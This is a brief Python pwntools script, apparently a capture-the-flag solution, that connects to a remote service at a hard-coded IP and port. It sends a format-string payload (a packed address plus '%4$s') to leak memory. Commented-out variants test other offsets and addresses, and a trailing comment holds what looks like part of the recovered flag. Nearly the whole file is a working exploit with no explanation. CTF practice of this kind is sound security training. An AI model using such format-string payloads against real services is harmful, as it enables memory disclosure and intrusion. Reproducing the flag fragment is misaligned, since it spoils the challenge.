from pwn import *

c = remote("34.125.199.248", 1337)

#prompt = c.recvline()
#print(prompt.decode())

#payload = b'%6$s'
#payload += b'xxxx'
#payload += p32(0xffffdcc0)

payload = p32(0xffffdd40) + b'.%4$s'

#payload = p32(0x08049374) + b'.%4$s'

print(payload)

c.sendlineafter(">",payload)

response = c.recvall()
print(response)

#1ngs_l3ak4g3_l0l}
